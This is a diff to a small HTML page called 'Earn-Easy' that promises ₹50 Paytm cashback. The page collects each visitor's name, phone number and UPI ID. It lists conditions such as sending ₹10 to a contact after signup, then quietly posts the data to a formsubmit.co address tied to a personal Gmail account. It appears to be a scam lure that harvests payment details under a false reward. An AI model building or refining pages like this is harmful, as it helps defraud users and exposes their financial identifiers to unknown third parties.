@@ -1,81 +1,111 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Earn-Easy</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body{
-            margin:0;
-            font-family:Arial;
-            background:#0f0f0f;
-            color:white;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            height:100vh;
-        }
-        .box{
-            background:#1c1c1c;
-            padding:30px;
-            border-radius:12px;
-            width:320px;
-            text-align:center;
-        }
-        input{
-            width:100%;
-            padding:10px;
-            margin:10px 0;
-            border-radius:6px;
-            border:none;
-            background:#2a2a2a;
-            color:white;
-        }
-        button{
-            width:100%;
-            padding:10px;
-            background:#00c853;
-            border:none;
-            border-radius:6px;
-            color:white;
-            cursor:pointer;
-            margin-top:10px;
-        }
-        .offer-section{
-            display:none;
-        }
-    </style>
+<title>Earn-Easy</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{
+    margin:0;
+    font-family:Arial;
+    background:#0f0f0f;
+    color:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+.box{
+    background:#1c1c1c;
+    padding:30px;
+    border-radius:12px;
+    width:340px;
+    text-align:center;
+}
+input{
+    width:100%;
+    padding:10px;
+    margin:10px 0;
+    border-radius:6px;
+    border:none;
+    background:#2a2a2a;
+    color:white;
+}
+button{
+    width:100%;
+    padding:10px;
+    background:#00c853;
+    border:none;
+    border-radius:6px;
+    color:white;
+    cursor:pointer;
+    margin-top:10px;
+}
+button:hover{
+    background:#00e676;
+}
+.offer-section{
+    display:none;
+}
+.rules{
+    display:none;
+    margin-top:15px;
+    text-align:left;
+    font-size:13px;
+    background:#111;
+    padding:15px;
+    border-radius:8px;
+}
+</style>
 </head>
+
 <body>
 
 <div class="box">
 
 <div id="form-section">
     <h2>Earn-Easy</h2>
-    <p>Enter details to continue</p>
+    <p>Register & get Paytm cashback</p>
 
     <input type="text" id="name" placeholder="Full Name" required>
     <input type="tel" id="phone" placeholder="Phone Number" required>
     <input type="text" id="upi" placeholder="UPI ID (for cashback)" required>
 
-    <button onclick="showOffers()">Continue</button>
+    <button onclick="showOffer()">Continue</button>
 </div>
 
 <div id="offer-section" class="offer-section">
-    <h2>Select Offer</h2>
-    <p>Paytm Offer – ₹50 Cashback</p>
-    <button onclick="selectPaytm()">Claim Paytm Offer</button>
+    <h2>Paytm Referral Offer</h2>
+    <p>Get ₹50 Cashback</p>
+
+    <button onclick="showRules()">Claim Offer</button>
+
+    <div id="rules" class="rules">
+        <b>Conditions:</b><br><br>
+        • Must be a new Paytm user<br>
+        • Complete full registration properly<br>
+        • Must send ₹10 or more to any contact after signup<br>
+        • Do not delete account immediately<br>
+        • Cashback processed within 24–48 hours<br>
+        • Fake or incomplete entries will be rejected<br><br>
+
+        <button onclick="confirmOffer()">I Agree & Continue</button>
+    </div>
 </div>
 
 </div>
 
 <script>
 
-function showOffers(){
+function showOffer(){
     document.getElementById("form-section").style.display="none";
     document.getElementById("offer-section").style.display="block";
 }
 
-function selectPaytm(){
+function showRules(){
+    document.getElementById("rules").style.display="block";
+}
+
+function confirmOffer(){
     fetch("https://formsubmit.co/ajax/earneasy2026@gmail.com",{
         method:"POST",
         headers:{
@@ -87,6 +117,7 @@ function selectPaytm(){
             Phone: document.getElementById("phone").value,
             UPI: document.getElementById("upi").value,
             Offer_Selected:"Paytm",
+            Conditions_Agreed:"Yes",
             Date:new Date().toLocaleString()
         })
     })
